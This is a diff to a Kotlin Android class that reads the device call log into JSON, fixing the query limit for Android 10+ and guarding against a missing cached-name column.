@@ -125,20 +125,25 @@ class DataCollector(private val ctx: Context) {
                 CallLog.Calls.DATE,
                 CallLog.Calls.DURATION
             )
+            // Do NOT put LIMIT in the sort string — CallLog provider ignores/rejects it on Android 10+
             val cursor: Cursor? = ctx.contentResolver.query(
                 uri, projection, null, null,
-                "${CallLog.Calls.DATE} DESC LIMIT $limit"
+                "${CallLog.Calls.DATE} DESC"
             )
             cursor?.use {
-                while (it.moveToNext()) {
+                var count = 0
+                while (it.moveToNext() && count < limit) {
                     val obj = JSONObject()
                     obj.put("id",       it.getString(it.getColumnIndexOrThrow(CallLog.Calls._ID)))
                     obj.put("number",   it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) ?: "")
-                    obj.put("name",     it.getString(it.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)) ?: "")
+                    // CACHED_NAME may not exist on all devices — use getColumnIndex (not OrThrow)
+                    val nameIdx = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
+                    obj.put("name",     if (nameIdx >= 0) (it.getString(nameIdx) ?: "") else "")
                     obj.put("type",     callTypeLabel(it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))))
                     obj.put("date",     it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE)))
                     obj.put("duration", it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DURATION)))
                     arr.put(obj)
+                    count++
                 }
             }
         } catch (e: Exception) {
